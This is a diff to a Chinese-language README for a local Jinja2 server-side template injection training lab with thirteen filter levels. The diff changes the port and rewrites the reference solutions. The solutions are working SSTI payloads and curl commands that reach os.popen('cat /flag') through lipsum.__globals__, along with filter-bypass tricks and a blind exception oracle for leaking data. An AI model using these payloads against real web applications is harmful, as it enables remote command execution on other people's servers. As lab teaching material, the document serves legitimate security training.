@@ -2,7 +2,7 @@
 
 | | |
 |---|---|
-| 端口 | `8082`（`JINJA_CHAIN_PORT` 可改） |
+| 端口 | `8092`（`JINJA_CHAIN_PORT` 可改） |
 | 引擎 | Jinja2（Flask `render_template_string`） |
 | 关卡数 | 13（id `0`–`12`） |
 | 依赖网络 | 否 |
@@ -37,7 +37,7 @@
 | 9 | L10 前缀置空 | 载荷前拼 `{% set config=None%}{% set self=None%}` | 换未置空的全局入口 |
 | 10 | L11 组合过滤 | `' " + . [ ]` 与 `request` | `\|join` 替代 `+`，绕过取值通道 |
 | 11 | L12 强字符集 | 再加 `_`、数字、`\` | CTF 硬关 |
-| 12 | L13 扩展关键字 | 符号 + `request/class/init/arg/config/app/self` | CTF 硬关；`init` 会命中 `print` |
+| 12 | L13 扩展关键字 | 符号 + `request/class/init/arg/config/app/self` | CTF 硬关：`init` 会拦掉 `__init__`，逐个子串过一遍 |
 
 ## 参考解
 
@@ -62,10 +62,12 @@
 
 ### L3（id 2）盲渲染 ✅
 
-任意能成功渲染的模板都返回 `correct`。要读数据就把条件变成异常与否：
+服务端只回 `correct` / `wrong`。要读数据就把条件接到异常上：
 
 ```jinja2
-{% if <条件> %}{{ 1/0 }}{% endif %}
+ok                                   → correct
+{{ 1/0 }}                            → wrong（ZeroDivisionError）
+{% if 1 == 1 %}{{ 1/0 }}{% endif %}  → wrong，可用于逐位外带
 ```
 
 ### L4（id 3）禁止 `[` `]` ✅
@@ -79,41 +81,63 @@
 
 用 `request.args` 把字符串「从外部带进来」，payload 里一个引号都不出现：
 
-```
-POST /api/render
-{"template": "{{lipsum.__globals__.os.popen(request.args.c).read()}}"}
-# 同时传 ?c=cat /flag
+```bash
+curl -s -X POST 'localhost:8092/api/render?c=cat /flag' \
+     -H 'Content-Type: application/json' \
+     -d '{"level":"4","template":"{{lipsum.__globals__.os.popen(request.args.c).read()}}"}'
 ```
 
-或用过滤器把数字转成字符串：`{{7|string}}`。
+或用过滤器把数字转成字符串：`{{7|string}}`。被拦的样子：`{{ 'a' }}` → `WAF`。
 
 ### L6（id 5）禁止下划线
 
-`|attr` 的参数是**字符串**，而字符串可以拼：
+> ⚠️ 这一关最容易被写错。**`'_'~'_'` 这种写法在本关是过不去的** ——
+> 本关禁的是**字符 `_` 本身**，不是子串 `__`。你的源码里只要出现一次 `_`
+> 就会被拦，所以「把 `__class__` 拆成 `'_'~'_'~'class'…`」在这里没用。
 
-```jinja2
-{{()|attr('_'~'_'~'class'~'_'~'_')}}
+两条真正可行的路（都实测过）：
+
+**① 属性名从请求里带进来（最短）** —— payload 里一个 `_` 都不出现：
+
+```bash
+curl -s -X POST 'localhost:8092/api/render?a=__globals__&b=os&c=popen&d=cat /flag&e=read' \
+     -H 'Content-Type: application/json' \
+     -d '{"level":"5","template":"{{lipsum[request.args.a][request.args.b][request.args.c](request.args.d)[request.args.e]()}}"}'
 ```
 
-注意源码里出现了 `'_'~'_'`，但**没有出现子串 `__`** —— 这是整条链的核心技巧。
-
-### L7（id 6）禁止点号
+**② 运行期造出 `_` 字符**：`'%c'|format(95)` 就是 `_`，源码里同样不出现 `_`：
 
 ```jinja2
-{{lipsum|attr('__globals__')|attr('os')|attr('popen')('cat /flag')|attr('read')()}}
+{{lipsum|attr('%c%cglobals%c%c'|format(95,95,95,95))}}   → jinja2.utils 的 globals 字典
+{{lipsum['%c%cglobals%c%c'|format(95,95,95,95)]['o'~'s']}} → <module 'os' (frozen)>
 ```
 
-本关方括号没有被禁，`[]` 也能替代点号。
+### L7（id 6）禁止点号 ✅
 
-### L8（id 7）关键字子串黑名单
-
-`class` / `arg` / `attr` / `open` / `global` 等都写不出来，所以要拼接：
+本关方括号没有被禁，**用下标替代点号**即可 —— 注意不要用 `|attr`：
 
 ```jinja2
-{{lipsum|attr('__glo'~'bals__')|attr('o'~'s')|attr('po'~'pen')('cat /flag')|attr('re'~'ad')()}}
+{{lipsum['__globals__']['os']['popen']('cat /flag')['read']()}}   → flag{...}
 ```
 
-也可以不打这条链，直接 `getattr` 改名拼接。
+> 这条链之所以必须用下标，是因为 `__globals__` 是一个 **dict**。
+> Jinja 的 `.` 访问会**先试 `getattr` 再回退到 `__getitem__`**，所以
+> `lipsum.__globals__.os` 能work；而 `|attr` 过滤器只做纯 `getattr`，
+> 对 dict **不**回退到下标 —— `{{lipsum|attr('__globals__')|attr('os')}}`
+> 会抛 `UndefinedError: 'dict object' has no attribute 'os'`。
+> 这是 13 关里最容易踩的坑之一。
+
+### L8（id 7）关键字子串黑名单 ✅
+
+黑名单含 `attr`，所以**这一关不能用 `|attr`**；`global` 也被禁，
+`__globals__` 不能原样写出来。用 `~` 拼接关键字、用下标取属性：
+
+```jinja2
+{{lipsum['__glo'~'bals__']['o'~'s']['po'~'pen']('cat /flag')['re'~'ad']()}}   → flag{...}
+```
+
+拼接后源码里不再出现 `global` / `open` 这些子串，但运行期属性名是正确的。
+（`'po'~'pen'` → `popen`；`'ca'~'t'~' /flag'` 也可以用来避开别处的 `cat` 规则。）
 
 ### L9（id 8）禁止数字
 
@@ -122,7 +146,6 @@ POST /api/render
 ```jinja2
 {{true|int}}          → 1
 {{false|int}}         → 0
-{{(1,2,3)|length}}    → 3（但本关连 1/2/3 都不能写）
 {{lipsum|length}}     → 由对象长度得到整数，无需字面量
 ```
 
@@ -160,7 +183,7 @@ scripts/build-frontend.sh            # Windows: scripts\build-frontend.ps1
 
 # 2) 起单个靶场
 cd labs/02-jinja-chain
-docker compose up --build            # → http://127.0.0.1:8082
+docker compose up --build            # → http://127.0.0.1:8092
 
 # 或在仓库根目录一次起全部
 docker compose up -d
@@ -169,8 +192,8 @@ docker compose up -d
 ## 直接调 API（不依赖前端）
 
 ```bash
-curl -s localhost:8082/api/lab-info | jq .levels[0]
-curl -s -X POST localhost:8082/api/render \
+curl -s localhost:8092/api/lab-info | jq .levels[0]
+curl -s -X POST localhost:8092/api/render \
      -H 'Content-Type: application/json' \
      -d '{"level":"1","mode":"god","template":"{% print(7*7) %}"}' | jq
 ```
